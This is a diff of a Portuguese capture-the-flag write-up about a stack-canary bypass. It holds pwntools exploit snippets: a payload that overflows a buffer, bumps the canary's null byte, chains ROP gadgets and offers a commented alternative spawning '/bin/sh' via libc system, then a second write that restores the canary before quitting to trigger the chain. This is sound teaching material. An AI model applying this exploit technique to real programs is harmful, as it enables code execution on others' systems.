@@ -109,7 +109,7 @@ ropLib.exit()
 Notou-se ainda que o canário tem um byte nulo (ver que na imagem acima que o canário acaba(começa) com \0), o que parece ser um impedimento para a escrita, porém, se somarmos um valor pequeno ao último byte do canário conseguimos ultrapassá-lo sem sermos detetados. Tal só acontece porque a deteção de integridade do canário só é feita ao sair da função main.
 Podemos assim, numa escrita subsequente, repor o canário para o estado original.
 
-Assim sendo,
+Assim sendo temos:
 ```python
 payload = flat(b"a" * buffOffset,canary + 2, b"A"*8, ropLib.chain())
 # payload = flat(b"a" * buffOffset,canary + 1, b"A"*8, libc.symbols["system"], b"A"*4, next(libc.search(b"/bin/sh")))
@@ -117,15 +117,17 @@ payload = flat(b"a" * buffOffset,canary + 2, b"A"*8, ropLib.chain())
 res = message(p, payload)
 ```
 
-Agora para repôr o estado do canário.
+Para repôr o estado do canário basta utilizar:
 
 ```python
 r = message(p, b"." * 19)
 ```
 
-Agora basta correr o programa e sair dele, usando a opção q.
+Agora basta correr o programa e sair dele, usando a opção "q".
 
 ![imagem-6.png](./imagem-6.png)
+
+Aqui encontra-se o python script finalizado e que foi utilizado para adquirir a flag:
 
 ```python
 
@@ -175,8 +177,6 @@ res = message(p, payload)
 r = message(p, b"." * 19)
 
 p.interactive()
-
-
 
 
 ```
